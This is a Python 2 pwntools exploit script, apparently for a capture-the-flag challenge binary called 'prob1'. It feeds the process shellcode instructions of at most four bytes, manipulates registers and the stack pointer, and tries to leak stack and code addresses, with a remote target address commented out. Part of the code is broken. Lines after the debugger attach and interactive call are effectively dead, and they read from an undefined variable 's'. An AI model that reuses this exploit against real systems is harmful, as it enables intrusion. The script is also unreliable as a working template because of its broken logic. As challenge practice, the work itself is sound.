from pwn import *
context(arch='amd64', os='linux')
context.terminal = ['tmux', 'splitw', '-h']

script = '''
b *0x555555554a93
'''

elf = ELF("./prob1")

p = process("./prob1")
print p.recvuntil("ready\n")
#p = remote('143.248.249.153',4000)
def send_instr(instrs):
    payload = asm(instrs, arch='amd64')
    if len(payload) < 4:
        payload += asm('ret', arch='amd64')
    assert len(payload) <= 4, "Payload too long: %s" % instrs
    p.send(payload)


def execute(ins, get_response=True, count=8):
    payload = cc_asm(ins)
    assert(len(payload)<=4)
    p.send(payload)
    if get_response:
        p.recv(count)

instruction_cache = {}
def cc_asm(ins):
    if ins not in instruction_cache:
            instruction_cache[ins] = asm(ins)
    return instruction_cache[ins]
 
info("store rtdsc address to r15") 
execute("pop r15; push r15")
for _ in xrange(0xa95 - 0x920):
    execute("dec r15; ret")
execute('mov [r13], r15')
send_instr('push rdi;pop r15')
for _ in range(32):
    send_instr('mov r14, r15')
    send_instr('lea r15, [r14-128]')

send_instr('mov r14, [r13]')
for _ in range(0x180):
    send_instr('inc r14')
send_instr('mov rsp, r13')
#send_instr('pop r15')
#gdb.attach(p, script)
gdb.attach(p)
p.interactive()
for _ in xrange(0xb18 - 0x8a2):
    execute("dec r15; ret")
 
execute("push rbp; pop rsi; push r15", get_response=False)
leak_stack = u64(s.recv(6)+"\x00\x00")
print "stack leak = {}".format(hex(leak_stack))
 
execute("pop r15; push r15")
for _ in xrange(0xb18 - 0x8a2):
    execute("dec r15; ret")
 
execute("push rsp; pop rsi; push r15", get_response=False)
leak_ip = u64(s.recv(6)+"\x00\x00")
print hex(leak_ip)
exit()
